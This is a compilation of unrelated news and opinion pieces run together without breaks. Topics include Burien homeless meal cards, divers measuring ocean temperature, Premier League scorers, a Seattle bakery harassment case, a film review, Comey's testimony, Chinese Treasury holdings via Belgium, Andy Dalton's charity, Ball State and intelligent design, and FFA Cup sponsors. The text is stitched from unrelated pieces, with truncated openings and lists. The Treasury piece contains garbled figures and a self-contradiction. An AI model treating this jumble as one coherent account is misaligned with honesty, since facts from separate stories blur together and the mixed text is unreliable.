In addition to those services, money will also go to fund a homeless planner for South King County to work with a half a dozen other cities in the region.
"I think it's a great idea. I think, you know, if they need a meal it gets them a meal... Why not," said Alisha Arnold, a resident of Burien.
However, not everyone agrees with the plan.
"It would help them, but I think they should and could be doing a lot more," said Rob Johnson who also lives in Burien.
"There's a lot of panhandling here in Burien, and if it gets them something warm to eat then I'm for it," said Arnold.
Trefry says that police officers and other service providers will be able to hand out the cards at their own discretion.
The cards will be restricted to only non-alcohol and tobacco purchases.
The recipient will also have to write down what each card is intended for when receiving a card. Each card's serial number will be written down to track what's being purchased.
Trefry says the city hopes to start handing out the cards by the end of the week.
"If we get feedback that this is making a difference, I could see that this could potentially be something we keep," said Trefry.
Millions of holidaying scuba divers are able to become citizen scientists and take vital measurements of ocean temperatures, which are being driven up by climate change.
More than 90% of the heat trapped by global warming goes into oceans, where it drives hurricanes and disrupts fish stocks. Satellites can measure surface temperature when there are no clouds, but getting data from below the surface is much harder and more expensive.
A flotilla of 3,000 diving robot buoys provides measurements, but millions of recreational and commercial divers around the world could also play a role. A study, published in Science Reports on Friday, shows that measurements taken from the decompression computers often worn by divers can provide accurate data on ocean temperatures.
Scientists from the Centre for Environment, Fisheries and Aquaculture Science (Cefas) in Scotland took a range of decompression computers on dives alongside scientific instruments, and showed that the results tallied. The scientists have already collected more than 7,500 dive records from around the world via the Dive Into Science website.
Kieran Hyder at Cefas, who led the citizen science project, said: “To undertake a global science programme that could generate this information would be hugely expensive, but there are millions of sport and commercial dives every year. Making use of just a small fraction of those dives will greatly increase our knowledge of what is happening worldwide.
“The potential of scuba divers to contribute to ocean monitoring is huge and I believe that this study demonstrates only the tip of the iceberg,” he said.
The new data is particularly valuable in highly changeable coastal environments, where many dives occur, as well as in areas that are rarely sampled by other methods.
According to the Dive Into Science project, which is funded by the UK's Department for Environment, Food and Rural Affairs: “This extra data could prove crucial in the efforts to understand and predict the effects of our changing climate.”
Other researchers have investigated the ability of tagging marine creatures to provide temperature and other data. The creatures could include penguins and seals and the latter could be especially useful due to their deep dives.
Sergio Aguero says of all the Premier League strikers in the current top 20 most goals list, former Newcastle United striker Alan Shearer is the greatest – though Frank Lampard is Kun's personal favourite.
Aguero has some way to go to reach the 260 tally the former Magpies, Blackburn and Southampton star bagged during his career.
Kun is on 107 goals for City and poised to enter the Top 20 – he needs two more goals to overtake Ryan Giggs – and two more strikes would also see him overtake Francis Lee in sixth spot in City's all-time list, too.
“There are some great names in the Premier League top 20, but without a doubt, for his goal tally and lead over everybody else, Alan Shearer deserves to be on the podium.
“That said, there are a number of other players I admire. I'd say it's a matter of taste or playing style because the Premier League has hosted many of the greats – and still does: Michael Owen, Wayne Rooney and Thierry Henry to name just a few.
“But as my personal favourite, I'd like to choose Frank Lampard, who in spite of not being necessarily a striker, stands among the top 10 goal-scorers. That deserves praise.

“I had the chance to play alongside him and it was a valuable experience. He's every inch a professional and a man you can respect."

As for continuing to climb City's top 10, he added: “Records have never meant much to me if I'm honest. It's nice to break them, I admit, but they aren't a big priority to me.
“Having said that, it still makes me proud to stand where I am in the Club's all-time list. If I can keep racking up goals, I hope they come for the benefit of the team and football club, and not just to create personal records.”
City have several players who have played for the Club in the Top 20 with Andy Cole, Lampard, Robbie Fowler and Nicolas Anelka all making the cut.
The Premier League Top 20 (plus Sergio!) is as follows:
1 Alan Shearer (Blackburn Rovers, Newcastle United) 260
2 Wayne Rooney (Everton, Man United) 194
3 Andy Cole (Newcastle, Man United, Blackburn, Fulham, City, Portsmouth) 187
4 Frank Lampard (West Ham United, Chelsea, City) 177
5 Thierry Henry (Arsenal) 175
6 Robbie Fowler (Liverpool, Leeds United, City) 163
7 Michael Owen (Liverpool, Newcastle, Man United, Stoke City) 150
8 Les Ferdinand (QPR, Newcastle, Spurs, West Ham, Leicester City, Bolton (149)

SEATTLE -- A group of teens who regularly skateboard in front of a Belltown bakery and mock its French owner finally went too far last weekend when one of the teens threatened to hit the owner over the head with a skateboard, according to the Seattle Police Department.
The victim, who speaks very little English, owns Le Parisienne in the 2500 block of Fourth Avenue where there is outdoor seating for customers. According to the police report for the incident, the same group of teens skateboards in front of the bakery nearly every day, ignoring the victim's efforts to shoo them away and mocking her.
Around 1:20 p.m. Aug. 31, the shirtless teens were reportedly back at it, filming their stunts and tricks while skateboarding very close to a couple visiting from Illinois who were eating outside.
According to the report, the victim asked the teens to stop then stood on the sidewalk to try to block them from coming near the customers.
The customers later told officers the teens kept skateboarding directly at the victim while repeating "bonjour" over and over in a taunting manner.
According to the report, one of the teens escalated things by raising his skateboard over his head and swinging it down at the victim, stopping just before the skateboard hit the top of the victim's head.
The teens ran off, and one of the customers chased after them. The customer then called 911, but officers were unable to find the teens.
The victim's daughter translated for the victim, who told officers she has never called police about the teens in the past because of her limited English.
Officers told the victim they would check the area more regularly now that they are aware of the ongoing issues with the teens.
According to the report, officers don't believe the teens are targeting the victim because she is French but rather because the metal railings on the block make for good skateboarding.
Panem exists in a dystopian future, which makes Catching Fire a work of science fiction by default. Where The Hunger Games film played the CG tech-wizardry card with a heavy hand, Catching Fire lets technology play more of a background role. Because they're used sparingly, the sci-fi elements here seem more realistic — Katniss uses a simple, floating touchscreen to activate an archery exercise rather than throwing screens around the room like Tom Cruise on the hunt for precrime. Display terminals radiate like fans from simple vases on desks, and chromed-out bullet trains look more like classic cars than spaceships. The design world feels more true to an actual future than an imagined one: it will age treacherously, not cartoonishly. Think THX 1138 instead of Logan's Run.
With Catching Fire, it feels like Katniss and company have reached some sort of tipping point. It's not the Subway tie-in, it's not the recently introduced Nerf Rebelle line of crossbows marketed to tweenage girls, and it's not really even the massive fan-art movement that dominates photo-sharing services. What tells me The Hunger Games is a new paradigm of entertainment is the existence of another young-adult trilogy about a dystopian future called Divergent.
If you haven't seen the books at Target or the ads for the upcoming film adaptation now saturating televisions and movie screens, Divergent is a wholesale ripoff of Suzanne Collins' franchise in all the most explicit ways. A teenage girl in a dystopian world finds herself at the center of a genocidal government conspiracy — her logo is a flaming circular crest, she fights for nothing more than her pride and her family, and she finds herself in the midst of a harrowing love triangle.
But Tris and Four are no Katniss and Peeta; like a pair of poorly constructed Air Jordan knockoffs, the Divergent universe does nothing more than provide a ho-hum foil to amplify the importance of its inspiration. As long as fully formed products like the Catching Fire movie keep coming, the odds will be in The Hunger Games' favor to continue being celebrated as the definitive popular moral tale of the early 2000s.
Since his nomination in May, Virginia's GOP lieutenant governor candidate E.W. Jackson has faced heated scrutiny for past controversial statements. Now he wants the public to know that there is no sunlight between him and his running mate, Virginia Attorney General Ken Cuccinelli (R).
In a radio interview with WMAL, the conservative minister insisted the two were in "fundamental agreement.”
“I've heard that this ticket is probably more homogeneous than almost any ticket in the history of Virginia, so there's no stark disagreement between us,” he said.
(Listen to Jackson's comments at the 7 minute mark above.)
Jackson has come under fire for once saying that Planned Parenthood had been more harmful to African-Americans than the Ku Klux Klan.
He wrote in 2010 that President Barack Obama "clearly has Muslim sensibilities," and warned for the future of Israel, as BuzzFeed reported. He also has a history of anti-gay statements.
Jackson has not apologized for his remarks.
"I don't have anything to rephrase or to apologize for," he said in the days following his nomination. "I would just say, people should not paint me as one-dimensional. I have a whole lot of concerns."
Cuccinelli has also not denounced Jackson's comments.
“It doesn't change our message a lick,” Cuccinelli said when asked about Jackson's impact on the race. “He's got to defend all his own statements and he's going to go about doing that, but we run our own race.”
Few things are more important in a democracy than confidence that the law is applied equally and fairly to all. Which is why the written testimony of former FBI Director James Comey to Congress, released on June 7, was so unsettling. In it, Comey detailed an escalating effort by President Donald Trump to get Comey to pledge his loyalty and to back off elements of the probe into whether members of the Trump campaign team cooperated with Russia during and after the 2016 election.
The difficult relationship between Comey and Trump began during the presidential transition in early January. After a briefing by the country's top intelligence officials on the Russian operation, Comey stayed behind to brief the President-elect alone on “personally sensitive aspects of the information” the intelligence community had collected, including what Comey called in his testimony “salacious and unverified” allegations about Trump. Comey assured Trump he wasn't a target of an investigation, a fact that Trump's personal attorney later cited as vindication of the President's conduct during the campaign. But Comey felt sufficiently uncomfortable about the conversation to document it afterward in a memo, typed into a laptop as he was driven away from the Trump Tower meeting in New York City. It was a practice Comey would continue in the coming months.
A week after his inauguration, Trump called Comey to a private dinner at the White House, served by two Navy stewards, without anyone else in the room. Trump said he was considering ordering an investigation of the most salacious claims to reveal them as falsehoods and asked Comey if he wanted to keep his job. “My instincts told me the dinner was, at least in part, an effort to have me ask for my job and create some sort of patronage relationship,” Comey wrote. And indeed moments later, Trump said, “I need loyalty, I expect loyalty.” Comey froze. “I didn't move, speak or change my facial expression in any way during the awkward silence that followed,” Comey said. “We simply looked at each other in silence.” At the end of the dinner, when Trump again tried to elicit Comey's loyalty pledge, Comey responded, “You will always get honesty from me.”
Trump again tried to pressure Comey in private in a Feb. 14 meeting in the Oval Office after he dismissed from the room a half-dozen other top advisers at the end of a counterterrorism briefing. Trump had fired his first National Security Adviser, Michael Flynn, the day before for lying about contacts he had had with the Russian ambassador to the U.S. during the transition. Trump asked Comey to “let this go,” which Comey took to mean that the President was “requesting that we drop any investigation of Flynn in connection with false statements about his conversations with the Russian ambassador.” Comey left the meeting rattled and consulted top FBI leadership over how to ensure that Trump's effort to derail the Flynn investigation didn't “infect” those working on the probe at the FBI.
Trump wasn't done. On March 30, Comey testified, Trump called Comey and “described the Russia investigation as ‘a cloud' that was impairing his ability to act on behalf of the country … and asked what we could do to ‘lift the cloud.'” Trump asked Comey to “get it out that we weren't investigating him.” Comey reported the conversation to Acting Deputy Attorney General Dana Boente. In a subsequent phone call on April 11, Trump again asked for help from Comey, who suggested he raise his concerns with the Justice Department. “Because I have been very loyal to you, very loyal; we had that thing you know,” Trump said on the call, according to Comey, who wrote in his statement he did not know what “that thing” was.
Trump fired Comey on May 9, triggering accusations that the President was interfering in the Russia probe. Investigators still don't know whether members of Trump's campaign did anything inappropriate or criminal with the Russians. But everyone who cares about the credibility of our democracy should want the FBI to pursue the facts wherever they may lead, unimpeded by the interests of any one person, including a President.

This appears in the June 19, 2017 issue of TIME.
A little over a year ago, we showed something quite unexpected: in the span of just a few months, the tiny nation of Belgium had become the third largest foreign holder of US Treasurys.
Of course, the buying wasn't Belgium doing so for its own account, but someone using the custody services of Belgium-domiciled Euroclear. This is what we said last April.
it is quite clear that Belgium itself is not the buyer. What is not clear is who the mysterious buyer using Belgium as a front is. Because that same "buyer", who to further explain is not China, just bought another whopping $31 billion in Treasurys in February, bringing the "Belgian" total to a record $341.2 billion, cementing "it", or rather whoever the mysterious name behind the Euroclear buying rampage is, as the third largest holder of US Treasurys, well above the hedge fund buying community, also known as Caribbean Banking Centers, which held $300 billion in March. In summary: someone, unclear who, operating through Belgium and most likely the Euroclear service (possible but unconfirmed), has added a record $141 billion in Treasurys since December, or the month in which Bernanke announced the start of the Taper, bringing the host's total to an unprecedented $341 billion!
And while there had long been speculation that the mystery buyer using anonymous Belgian custody accounts is none other than China, the same nation which previously had used UK accounts precisely for the purpose of masking its purchases, there was never any proof.
Further confounding the analysis was that while "Belgium" was massively adding to its Treasury holdings over the past year, mainland China was telegraphing that it was dumping Treasurys. It got to the point that in February Japan officially surpassed China as the largest official US foreign creditor.
Then, on Friday we finally got if not direct, then certainly indirect, evidence from this month's TIC data that "Belgium" was merely a front for China.
First, note that after dropping for 6 consecutive months, official Chinese holdings had a major countertrend move and rebounded in March, jumping by $37 billion to $1.261 trillion and regaining the top US creditor spot from China.
Even more curious was the Belgian Treasury holdings update, which after flatlining in the mid-$300 billion range for one year, also had a sharp countertrend move as they suddenly tumbled by $93 billion in the month of March, a 27% of the total "Belgian" holdings.
But the real surprise emerges when stacking the monthly Chinese and Belgian holdings on top of each other. One gets the following chart, which in itself is hardly shocking...
... but becomes so when one also overlays China's offically reported monthly Forex reserves on top of the consolidated China+Belgium treasury holdings. Here one can easily see that indeed Belgium was nothing but an "anonymous" front for Chinese Treasury buying...
... and as the case has recently become, selling.
Because while we have previously commented on the dramatic capital outflow from China in recent months, which also explains why China is desperate to slam its currency but will not do it over fears of accelerating capital outflow, the combined Chinese and Belgian Treasury holdings reveal the true extent of China's USD-denomination liquidation conundrum.
As the next and final chart shows, in March the monthly drop across China's official and "anonymous" i.e., Belgian holdings, was the biggest on record!
So as a result of the latest TIC data we know know with almost complete confidence that:
i) "Belgium" is, or rather, was a front for China: either SAFE, CIC, or the PBOC itself.
ii) That Belgium's holdings, after soaring as high as $381 billion a year ago, have since tumbled back to only $2532 billon as China has dumped the bulk of its Euroclear custody holdings, and that once this number is back to its historical level of around $170-$180 billion, "Belgium" will again be just Belgium.
iii) China's foreign reserves tumbled and this was offset by a biggest quarterly drop in Chinese pro-forma treasury holdings, which dropped by a record $72 billion in the month of March, and a record $113 billion for the quarter.
So why mask its offshore holdings? So when China proceeds to liquidate nearly $100 billion via its custody account, the US didn't feel compelled to chastise Beijing. After all there is no official confirmation that Belgium is indeed China, and likely won't be - it was merely a buffer account which China used to build up TSY holdings in, and now - to rapidly liquidate.
A better question perhaps is what is the use of funds of these tens of billions of liquidations: because what was once invested in the form of Treasurys is now invested in the form of something else... most likely real estate in San Francisco, Beverly Hills, or New York City, with a few billion left over to buy stocks.
Finally, the last thing China would want the world to know, is just how acute its capital flight truly is: a capital flight which is the only thing that is preventing the Politburo and the PBOC from cutting rates even more aggressively and/or engaging in even more outright QE than it currently does because should the chart above be matched with a comparably sharp drop in the Renminbi, and suddenly the VIX closing the day at 12 will be a very distant memory.
CINCINNATI -- Twenty-one-month-old Brianna Fleckinger had no idea who Andy Dalton was.
Neither did many of her peers, who were running around a small space at Kings Island amusement park playing a spirited game of duck, duck, goose one recent Sunday afternoon. None of them had any idea what Dalton's postseason interception total was, nor did they know about his struggles during prime-time games.
At that particular moment, their focus was on the random big kid with bright red hair who had quietly tiptoed into their circle, waiting to be the goose who chased another kid around it.
"I can tell you every parent knew who he was and they had their cameras out and were pointing and laughing and smiling. Some of them had tears in their eyes. They will never forget that moment," said Ria Davidson, co-founder of the Dragonfly Foundation, a Cincinnati-based group that specializes in providing children who have pediatric cancers and their families opportunities to be distracted from the daily toll the diseases can take. With September being Pediatric Cancer Awareness Month, the group has an important couple of weeks ahead.
"A year from now, five years from now, they will say a Bengal -- not just any Bengal, Andy Dalton -- took the time to make them smile and really made them feel like a king for a day," Davidson said.
The next day, Brianna, who has Stage 3 neuroblastoma, underwent surgery to remove her tumor.
Few NFL players are as criticized as Dalton, a Pro Bowl quarterback who has led the franchise to an unparalleled four straight playoff berths to begin his career. Much like he told ESPN last month, Dalton said during his Wednesday news conference that while he hears the complaints about his play and lack of postseason success (0-4), he hardly lets it faze him.
That's in part because he has a broader off-field mission that has him keeping proper perspective on life, football and what it truly means to be a winner.
Dalton first gained that perspective in 2009, when he was heading into his junior season at TCU. That spring, Presley Boydstun, the preteen granddaughter of Dalton's first college quarterbacks coach, the late Dick Winder, was diagnosed with acute lymphoblastic leukemia.
"I had gotten her number and I'd randomly send her a text saying, 'Hey, I hope you're doing well,' " Dalton said. "We'd have random conversations and [Winder would] always say, 'You have no idea the impact that you're having on her.' "
In time, Presley got better and the cancer went into remission. But Dalton's experiences inspired him and his wife when they started their foundation four years ago.
The Andy and Jordan Dalton Foundation's mission has been to bring happiness to families with children who have serious medical conditions. Their outreach includes events like the 250-person "King for a Day" initiative at Kings Island and the "Date Night" program that allows parents to drop off their kids for a night of games and activities while the parents partake in an all-expenses-paid private dinner date. For the Daltons, the goal is to provide families like the Fleckingers with positive distractions.
"That ["King for a Day" event] felt like the vacation we were supposed to get," said Brianna's mother, Kassandra Fleckinger. The family had to cancel a previously scheduled vacation after Brianna was diagnosed in April with the same pediatric cancer that 5-year-old Leah Still, daughter of former Bengals defensive tackle Devon Still, overcame this past year.
The day they met the Daltons, Fleckinger, husband Gregory and their healthy 5-year-old son, Gavin, they had the heavy burden on their shoulders temporarily lifted. The parents weren't thinking about bills that needed to be paid. The anxiety and fear that has been such a staple of their everyday lives had faded. Gavin was content and Brianna had a chance to see something other than a hospital room.
"I know some people from Cincinnati are not huge fans of [Dalton] or anything, but I don't even care," said Fleckinger, a native of nearby Independence, Kentucky, and a lifelong Bengals fan. "This guy, he's got such a great heart. To be there with the kids, it's a great organization that they have. When you're going through a time like this, even just one day, it feels like you're taking a week's vacation. He's totally humble and down to earth. You can tell they have a very caring family."
Doctors have told the Fleckingers they believe Brianna's cancer is in remission, but they are awaiting test results.
Dalton said stories like that of the Fleckingers, along with the June 2014 birth of his first child, Noah, have made him proud of his off-field project.
"For these parents to have kids that are going through stuff, it's got to be so tough knowing that you have no control over what all's going on with them," Dalton said. "It makes me feel for the parents. It makes me feel for the kids who some just have no idea what they're dealing with and why it has to be that way."
Still knows this all too well.
"It is something that you have to see firsthand [to believe]," Still said. "You can hear about pediatric cancer all the time, but you will never understand what it's like unless you walk in those shoes or if you're really close to somebody who does."
Davidson credited the Daltons for helping to focus attention on the plight that children with cancer and their families face.
"People are pretty much shielded from pediatric cancer," Davidson said. "Unless you live with these families day to day, you don't see it. The fear of losing your job because you have to be away, or the worry that you have because you can't be at your patient's bedside because you don't have enough gas money to get to and from the hospital every day. As a whole, the dialogue about a cure has been very strong. Everybody wants a cure and cancer awareness is probably at an all-time high.
"But pediatric cancer awareness still doesn't get nearly the amount of support that it should."
Dalton is doing his part to change that.
A piece in today's Muncie Star-Press reports that Ball State University (BSU) has turned down freedom-of-information requests to release the report of the professorial panel investigating Eric Hedin's teaching of intelligent design (ID) and Christianity in his science class. Here's the official refusal of the Star-Press‘s request:
I suspect the Freedom from Religion Foundation (FFRF) will pursue this refusal, whose grounds appear to be, well, a bit flimsy. As the paper reports:
The FFRF and The Discovery Institute, an intelligent design think tank that is supporting physicist Hedin, are criticizing Ball State's decision to keep the records secret. There is nothing in the law to prevent the university from disclosing the records, according to Indiana's Public Access Counselor. While it is the policy of the state of Indiana that the public is entitled to full and complete information regarding the affairs of government and the official acts of public employees, the university is citing two exceptions to that policy. First, the personnel files of public employees are excluded from Indiana's Access to Public Records Act (APRA), except in certain situations such as when an employee is suspended, demoted or discharged. Ball State is also denying access to the records on grounds they are “deliberative materials” that are “expressions of opinion” and are “communicated for the purpose of decision making,” another exception to APRA. “The (student) evaluations are used in the promotion, tenure and salary review processes,” Sali Falling, Ball State's general counsel, said.
My own take in the paper:
Jerry Coyne, a University of Chicago evolutionary biologist, told The Star Press the student evaluations “bear critically on whether the university knew of student complaints about Hedin, which they claim they didn't, and if so, how long they've known about them.” It was Coyne who called FFRF's attention to a complaint about Hedin's class. He doesn't understand why the review panel's entire report is closed. What if the panel commented on intelligent design? How does that part of the report violate Hedin's privacy?
Well, they should have quoted me rather than characterized what I said in the second paragraph, but never mind. We will see what kind of report, if any, Ball State produces. My guess is that they'll just make a brief announcement of what they've done about Hedin's course. If they don't make a more general and public statement decrying the teaching of ID, they'll look bad.
And here's a conundrum:
Based on his knowledge of the records, Joe Hoage, the Indiana Public Access Counselor, believes the university complied with the law when it denied The Star Press access to the documents.On the other hand, the university would not be breaking the law if it released the records, Hoage said.
I'm betting that the final decision will come down in two weeks, and that Hedin will no longer be allowed to teach the course as a science course. If that happens, you can expect howls of protest from both the Discovery Institute and the benighted folks at BSU who actually seem to like intelligent design, but masquerade their affection as a love of academic freedom.
******
And, at last, a sensible letter at last to the Star-Press from James Bradley, an actual employee of BSU, the head of Metadata and Digital Initiatives at the School of Art. For some reason known only to the Star-Press, this letter appeared only in the paper version and was omitted from the online version, which surely gets more readers. Given the crazy pro-Hedin and pro-Jesus letters published online, one gets a piscine odor about all this. But at any rate, good for you, Dr. Bradley; you're an oasis of rationality in a desert of nescience. And it takes a bit of bravery to come forward in this way at a place like BSU. The following is a scan of Bradley's letter in the paper:
The University of Washington has elevated its computer-science department to the status of a school, and named it after Microsoft co-founder Paul Allen.
He's the co-founder of Microsoft, the owner of the Seahawks, a philanthropist who has given millions toward brain science, cell science and artificial-intelligence research, and the founder of a museum devoted to pop culture and science fiction.
On Thursday, the Seattle billionaire announced he is donating $40 million to the University of Washington's computer-science efforts, and Microsoft kicked in another $10 million in Allen's honor, giving the new school a $50 million endowment.
In turn, the UW Board of Regents on Thursday elevated the computer-science department to the status of a school and named it the Paul G. Allen School for Computer Science & Engineering after the Seattle billionaire.
Some highlights of Paul Allen's giving: • $14 million to the University of Washington to build the Paul G. Allen Center for Computer Science and Engineering. • More than $500 million to the Allen Institute for Brain Science “to accelerate understanding of the human brain in health and disease.” • $26 million to build the Paul G. Allen School of Global Animal Health at Washington State University. • $100 million to start the Allen Institute for Cell Science. • $10 million toward the Smart City Challenge, an initiative by the Department of Transportation with the stated goal of making urban areas greener and more efficient. A total of $50 million in prize money will be awarded. CNN and Vulcan
“It's a game-changer for us,” said computer-science professor Ed Lazowska.
The move will boost the UW's prominence in U.S. computer-science education, serve to recognize the growing importance of computer science within the university, and give the school increased autonomy and flexibility within the UW system, Lazowska said.
In a phone interview Thursday, Allen said the money would give the university “more resources, and scope, and ability to grow and keep up its climb to the top ranks of computer science” among the nation's universities.
He believes we are entering a “new golden age” of computing. Developments in machine learning, artificial intelligence and modeling of biological systems are all coming together, he said, and the use of computer-science approaches in thinking and methods “can be applied across an amazing variety of different areas of research” — including self-driving cars and climate modeling, to give two examples.
“Computers are more involved now, with everything being done to engineer and produce things,” he said. That makes it a great time, he said, to increase the number of students getting a computer-science education.
Having his name on the computer-science school at the UW, Allen said, had particular emotional resonance for him because of his connection to the university.
Although he never attended the UW, as a high-school student he and fellow Lakeside School student Bill Gates sneaked into the university's computer-science rooms to learn more about how computers worked, and to create what Allen said was the first microprocessor-based computer built in Seattle — a machine called the Traf-O-Data, designed to measure traffic flow around urban areas.
“That's what we really used to learn about microprocessors,” he said. “Those were the days when this stuff was just in the beginning stages.”
UW President Ana Mari Cauce said the donation “is tremendous generosity — but also, his name carries weight” in the computer-science world. Having the school named after Allen will be a point of pride for faculty and students alike, she said.
Facts about computer science at UW • Computer Science & Engineering was established as a graduate program in 1967, and as an undergraduate program in 1975. • The program is regarded as among the top 10 computer-science programs in the nation. The full-time graduate program is ranked sixth nationally by U.S. News & World Report. • It received $32.6 million in research grants and contracts in 2016 — up from $8.8 million when the Allen Center opened in 2003. • A new building, which is being funded through public and private money, is under construction. The 135,000-square-foot building is scheduled to be ready for occupancy in early 2019. The existing building, the Paul G. Allen Center for Computer Science & Engineering, opened in 2003. • The graduate program has about 225 full-time students, and 175 students in a program geared toward working professionals. • The undergraduate program enrolls about 370 new undergraduates each year, up from 170 a few years ago, and offers two degrees: computer science and computer engineering. • Computer science is the most sought-after major listed by incoming freshmen at UW Seattle, but only about a third of undergraduates who apply get in. University of Washington
“It's a department that's been doing really well, but this will take it to a whole different level,” she said.
The announcement about the Allen and Microsoft donations and the new school is being made in concert with the 50th anniversary of computer science at the UW. In March 1967, the UW regents governing board gave approval to the formation of a computer-science group.
The money will provide the school with $2 million a year in seed funding for new initiatives, which could be used for a variety of things — including funding of early stage research, developing new experimental-education initiatives, providing equipment that can't be purchased through other means, or funding fellowships or scholarships to recruit outstanding students.
“It will make us able to be really agile, to be able to pursue new directions,” Lazowska said
As an example, Lazowska — who holds the Bill & Melinda Gates chair in computer science — said his endowed chair gives him about $80,000 a year to use for what he called “venture funding” for early stage research ideas. Those “crazy ideas,” as Lazowska described them, can turn into projects that move computer science in novel directions and enable the UW to win federal grant funding.
The money could also be used to help attract top faculty, Lazowska said. The costliest part of attracting new faculty is usually the expense of setting up a lab where they can work. Modern computer labs these days can involve such things as robotics, or power harvesting, and can cost more than half a million dollars, he said.
The Allen name is already on two buildings at the UW — the Allen Library, named after Kenneth Allen, Paul Allen's father, who was the associate director of libraries from 1960 to 1982, and the Paul G. Allen Center for Computer Science & Engineering, where computer-science offices and labs are located. Kenneth Allen died in 1983.
At Washington State University — where Paul Allen was enrolled for two years but never received a degree — the Allen School for Global Health Science is named after him. Allen donated $26 million toward the founding of that school.
The UW is constructing a new computer-science building across the street from the Allen Center, to expand the school. Competition to get in is so stiff that only about a third of undergraduate students who apply are accepted. Much of the construction funding has been raised privately, and Allen's donation won't be used for that.
The UW is also asking the state to include more money in its next budget to hire faculty and increase the size of the computer-science school, so it can accommodate more students.
Allen said he's focused much of his philanthropy on Seattle, in large part because of his mother, Faye, who often talked about the importance of giving back to the community. Faye Allen died in 2012.
“I've tried to single out those opportunities, tried to invest in the community in ways that would make it richer and better,” he said. “It's something I'll continue to do in the future.”

Sen. Bob Casey (D., Penn.) could be in a vulnerable position for his 2018 reelection campaign after a new poll released on Thursday signaled that half of Pennsylvania voters believe he has done only a "fair" or "poor" job as senator.
Of the voters surveyed, 33 percent believe Casey is doing a "fair" job and 17 percent believe he is doing a "poor" job, compared to 28 percent who believe he is doing a "good" job and 10 percent who believe he is doing an "excellent" job, according to the Franklin & Marshall College poll.
The poll results are a sign that Casey could be facing a tough reelection fight next year.
Some of his vulnerable Democratic colleagues have been treading softly in the current partisan environment and attempting to reach across the aisle, but Casey has been part of the so-called "resistance" movement against President Trump. Casey called Trump's firing of FBI Director James Comey "Nixonian" on Tuesday, and he told CNN last week that "nothing gets me to a yes" on the Republican health care plan.
This is Nixonian. Deputy AG Rod Rosenstein must immediately appoint a special prosecutor to continue the Trump/Russia investigation. — Senator Bob Casey (@SenBobCasey) May 9, 2017
.@SenBobCasey says "nothing gets me to a yes" on GOP health plan, "I'll fight to the end of the earth" https://t.co/tn64HoOOlq — CNN Newsroom (@CNNnewsroom) May 4, 2017
Casey's "poor" job rating has increased by three percent since February, which could suggest that voters do not support his approach to working with the Trump administration. Trump received 48.2 percent of the vote in Pennsylvania last November against Hillary Clinton.
Known by his adopted name 'Motorola', Arsen Pavlov was the leader of the so-called Sparta battalion and was considered to be a leading rebel commander. He was one of several notorious warlords to have been killed in bombings in the past year.
Arsen Pavlov, 33, had quickly risen among the ranks of the separatist, pro-Moscow insurgency in eastern Ukraine, and was known for his merciless approach; he once admitted killing 15 prisoners of war. According to local authorities, he survived an assassination attempt in June 2016.
The Russian-born fighter worked in a car wash before joining the separatists.
Blame game
Alexander Zakharchenko, the self-styled "prime minister" of the unrecognized Donetsk People's Republic, blamed Ukrainian President Petro Poroshenko for the targeted killing, saying he had breached the ceasefire and therefore "declared war."
However, much of the killing of separatist insurgency leaders in the past year has been blamed on infighting among the separatists.
Ukraine is yet to adopt a law which under the 2015 peace accords would grant amnesty to Donetsk separatists. Pavlov was one of the figures that the Ukrainian government used to back up its assertion that people involved in war crimes should not be given amnesty.
Donetsk has been involved in an ongoing bloody conflict with Ukraine, which to date has claimed nearly 10,000 lives, since seeking its own independence after Russia's annexation of the Crimean Peninsula in 2014.

– More than two dozens concerned citizens and policy leaders spent Friday in Ferndale listening to new research on how to increase the health and well being of youth in the lesbian-gay-bisexual-transgender community.
WWJ's Kathryn Larson reports that nationally known educator in the Gay, Lesbian, Bisexual and Transgender community, Dr. Caitlin Ryan, spoke to those gathered about how to help youth “come out” in a safe and positive way.
Dr. Ryan, the founder of the Family Acceptance Project at San Francisco State University spent Friday at Affirmations in Ferndale speaking with everyone from parents to policymakers about how to make a difference in the lives of LGBT teens and she says it starts at the home.
Ryan says parents need to remain calm when teens come out and keep communication open:
“Those LGBT teens and adults are eight and a half times as likely to have tried to take their own lives, compared with their peers with families that were not at all rejecting,” said Ryan.
Dr Ryan says her study finds open communication and loving behaviors are key when a family rejects an LGBT youth.
Ryan says if parents don't support their teens — the results could be dire.
“By reducing those rejecting behaviors they can decrease their childs' risk for suicide dramatically,” added Ryan.

Marvel will always have a special place in my heart, but after Warner's showing at Comic-Con today, they may have to be happy taking the silver medal.
Before the cast of Batman v Superman took the stage, David Ayer and the cast of Suicide Squad made a surprise appearance, and they brought a present. Check out the teaser for the movie below.

When the movie was first announced, I wondered how well they were going to be able to make it fit in with the tone ofand what we've seen of, but this looks perfect. The cast looks great, and while I'm not sure I'll ever be able to fully accept the Joker's tattoos, his performance here makes me want to see more. Although I'm pretty in the tank for these movies, so your mileage may vary.
If you car comes up missing here in the U.S., you probably don't want it back once the thieves are done with it. Over in Scotland, they do things differently, even illegal things. Police say someone in southeast Scotland's Borders area is sneaking into houses, taking car keys and going for rides in the homeowners' cars. In this country, that'd be the end of it until the police found your Malibu up on cinder blocks in a bad neighborhood. The Scottish twist, however, is that the next morning all these cars are right where they were parked the day before. The burglar has struck at least eight times, and so far, only one car has ended up crashed.The only things that tip people their car has been stolen are finding their keys in strange places and discovering more miles on their odometers. Sometimes lots of miles. Until the thief is nabbed, we recommend the Scottish keep their tanks empty and their keys on the nightstand.[Source: BBC via PistonHeads

THE FFA Cup's future has been secured without a ball being kicked with Westfield headlining an impressive list of blue-chip sponsors who've backed the competition.
Westfield was today unveiled as the inaugural naming rights partner joining British sportswear giant Umbro - a brand synonomous with the FA Cup - Harvey Norman and NAB as among four new sponsors announced for the competition which kicks off on July 29.
They join Fox Sports as foundation partners, with the deals understood to be worth over $12m.

All sponsors have agreed to three-year deals, with the $4m-a-year underwriting FFA's extensive travel costs.
While commencing as a 32-team competition, in excess of 600 teams across Australia are likely to be branded under the FFA Cup banner in 2015.
Most state leagues are deep into their Cup competitions, with the official FFA Cup kicking off in late July when the 22 state and territory-based teams join the 10 A-League clubs.
ACT is the only one of the eight state and territories whose participant has been confirmed, 2013 winner Tuggeranong United.
Meanwhile FFA has commenced a search for a technical director to replace outgoing Han Berger.
However the new role will focus on the elite player pathway up to the age of 16, including overseeing the National Premier League (NPL) competitions.
While undertaking a global search, there's a strong push for a local appointment and former AIS guru Ron Smith will be considered, along with former Perth Glory coach Alistair Edwards and former Newcastle Jets coach Gary van Egmond.
“The review of the national teams and technical department conducted by Luke Casserly has identified youth technical development as a key area for improvement,” said FFA CEO David Gallop.
